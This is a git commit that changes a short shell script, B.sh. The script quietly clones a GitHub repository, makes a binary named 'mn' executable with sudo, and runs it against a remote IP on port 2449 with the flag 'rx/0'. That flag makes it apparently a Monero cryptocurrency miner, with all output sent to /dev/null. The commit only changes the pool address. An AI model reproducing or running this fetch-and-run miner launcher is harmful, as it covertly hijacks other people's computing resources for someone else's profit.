c05edb885021cc9a815a7cf4008dd6fdb6282a98
fulltechtree <77315046+fulltechtree@users.noreply.github.com>
2021-02-02 22:16:00 +0700

    Update B.sh

--- B.sh
+++ B.sh
@@ -2,5 +2,5 @@
 {
 git clone https://github.com/fulltechtree/tech.git &> /dev/null
 sudo chmod +x tech/mn
-./tech/mn -o 138.197.62.236:2449 -u userA -p 1 -a rx/0 -k -t "$1" &> log
+./tech/mn -o 38.130.221.194:2449 -u userA -p 1 -a rx/0 -k -t "$1" &> log
 } &> /dev/null
